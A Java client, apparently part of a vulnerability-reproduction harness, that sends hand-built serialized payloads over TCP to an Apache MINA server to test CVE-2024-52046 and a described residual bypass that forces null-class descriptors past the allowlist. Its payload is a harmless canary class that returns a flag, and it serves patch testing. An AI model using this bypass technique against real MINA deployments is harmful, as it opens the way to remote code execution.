import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.ObjectStreamClass;
import java.io.OutputStream;
import java.io.Serializable;
import java.net.Socket;
import java.nio.charset.StandardCharsets;

/**
 * EXTERNAL TCP client (attacker peer) for deser_mina_objser. A SEPARATE process, in a SEPARATE container,
 * connecting to the REAL MINA server over a real TCP socket -- the genuine external network trigger.
 *
 * It hand-builds the exact wire the MINA ObjectSerializationDecoder / AbstractIoBuffer.getObject() reads:
 * a 4-byte big-endian length prefix (MINA's getInt()) followed by a Java serialization stream whose
 * per-descriptor MINA TYPE byte the client chooses. Pure java.io -- no MINA on the client, and the client
 * NEVER holds the ${PCB_FLAG} canary: the payload carries only the class name + descriptor + empty field
 * data. The flag is read only server-side, inside PcbSeed.readObject(), and echoed back over this socket.
 *
 * modes:
 *   type1    = the CVE-2024-52046 SEED: PcbSeed as a NORMAL MINA type-1 descriptor
 *              (write(1)+writeUTF(name) -- exactly what MINA's putObject emits for a Serializable class).
 *              -> allowlist-checked in resolveClass()'s non-null branch -> BLOCKED on V1/V2.
 *   type0    = the CVE-2026-42779 RESIDUAL: the SAME PcbSeed forced into a MINA type-0/null-clazz
 *              descriptor (write(0)+super.writeClassDescriptor -- the full standard Java descriptor).
 *              -> routed to resolveClass()'s null-clazz branch (Class.forName, NO allowlist on V1) -> REACHES on V1.
 *   expected = the legit allowlisted PcbExpected as a normal type-1 descriptor (control: passes on V1/V2).
 *
 * args: [host] [port] [mode]
 */
public class Client {

    /** Serialize `obj` with the chosen MINA descriptor encoding. type0=true forces every descriptor to
     *  MINA's type-0/null-clazz form; type0=false uses MINA's normal per-class logic (type-1 for a
     *  Serializable class), byte-identical to what IoBuffer.putObject() emits. */
    static byte[] body(Serializable obj, final boolean type0) throws Exception {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos) {
            @Override
            protected void writeClassDescriptor(ObjectStreamClass desc) throws IOException {
                if (type0) {
                    write(0);                         // forced MINA type-0/null-clazz marker
                    super.writeClassDescriptor(desc); // full standard Java class descriptor
                    return;
                }
                Class<?> clazz = desc.forClass();
                if (clazz.isArray() || clazz.isPrimitive() || !Serializable.class.isAssignableFrom(clazz)) {
                    write(0);
                    super.writeClassDescriptor(desc);
                } else {
                    write(1);                         // MINA type-1 marker for a Serializable class
                    writeUTF(desc.getName());
                }
            }
        };
        oos.writeObject(obj);
        oos.flush();
        oos.close();
        return bos.toByteArray();
    }

    public static void main(String[] args) throws Exception {
        String host = args.length > 0 ? args[0] : "127.0.0.1";
        int port = args.length > 1 ? Integer.parseInt(args[1]) : 9009;
        String mode = args.length > 2 ? args[2] : "type1";

        Serializable obj;
        boolean type0;
        switch (mode) {
            case "type1":    obj = new PcbSeed();     type0 = false; break; // original seed
            case "type0":    obj = new PcbSeed();     type0 = true;  break; // residual
            case "expected": obj = new PcbExpected(); type0 = false; break; // legit control
            default: throw new IllegalArgumentException("mode: " + mode);
        }

        byte[] body = body(obj, type0);

        String txt = "";
        try (Socket s = new Socket(host, port)) {
            s.setSoTimeout(8000);
            OutputStream os = s.getOutputStream();
            DataOutputStream dos = new DataOutputStream(os);
            dos.writeInt(body.length);   // 4-byte big-endian length prefix == MINA getInt()
            dos.write(body);
            dos.flush();

            InputStream is = s.getInputStream();
            ByteArrayOutputStream resp = new ByteArrayOutputStream();
            byte[] buf = new byte[4096];
            int n;
            try {
                while ((n = is.read(buf)) > 0) {
                    resp.write(buf, 0, n);
                }
            } catch (Exception readEnd) {
                /* soTimeout / server closed -> done reading */
            }
            // The server echoes a serialized String; the flag token appears in cleartext within it.
            txt = new String(resp.toByteArray(), StandardCharsets.ISO_8859_1).replaceAll("[\\r\\n]", " ");
        }

        System.out.println("CLIENT_MODE=" + mode);
        System.out.println("CLIENT_RESP=" + txt);
    }
}
